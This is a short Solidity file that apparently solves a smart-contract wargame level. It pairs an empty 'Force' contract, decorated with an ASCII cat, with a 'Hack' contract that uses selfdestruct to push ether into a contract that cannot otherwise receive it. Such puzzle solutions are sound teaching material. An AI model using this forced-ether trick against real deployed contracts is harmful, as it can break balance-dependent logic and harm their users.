// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract Hack {
    constructor() payable {}

    function GiveBalance(address payable _address) external {
        selfdestruct(_address);
    }
}

contract Force {
    /*

                   MEOW ?
         /\_/\   /
    ____/ o o \
  /~____  =ø= /
 (______)__m_m)

*/
}
